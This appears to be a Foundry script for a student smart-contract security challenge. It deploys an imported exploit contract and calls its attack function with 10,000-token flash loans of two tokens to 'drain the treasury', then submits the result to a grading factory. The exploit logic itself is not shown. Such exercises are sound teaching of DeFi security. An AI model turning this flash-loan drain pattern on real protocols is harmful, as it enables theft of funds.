// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {Script} from "forge-std/Script.sol";
import {Challenge3} from "../src/Challenge3.sol";

interface IChallengeFactory {
    function check3(string calldata studentId) external;
}

contract Challenge3Script is Script {
    function run() external {
        // Load configurations from .env
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        string memory studentId = vm.envString("STUDENT_ID");
        
        // Load contract addresses from .env
        address challengeFactory = vm.envAddress("CHALLENGE_FACTORY");
        address pool = vm.envAddress("POOL");
        address dex = vm.envAddress("DEX");
        address rebalancer = vm.envAddress("REBALANCER");
        address tokenA = vm.envAddress("TOKEN_A");
        address tokenB = vm.envAddress("TOKEN_B");

        vm.startBroadcast(deployerPrivateKey);

        // 1. Deploy the exploit contract
        Challenge3 exploit = new Challenge3(
            pool,
            dex,
            rebalancer,
            tokenA,
            tokenB
        );

        // 2. Execute the attack twice to drain the treasury
        // 2-1. Using the 10_000 tokenA flash loan
        uint256 flashLoanAmount = 10_000 * 1e18;
        exploit.attack(tokenA, flashLoanAmount);
        
        // 2-2. Using the 10_000 tokenB flash loan
        exploit.attack(tokenB, flashLoanAmount);

        // 3. Trigger the verification on the ChallengeFactory
        IChallengeFactory(challengeFactory).check3(studentId);

        vm.stopBroadcast();
    }
}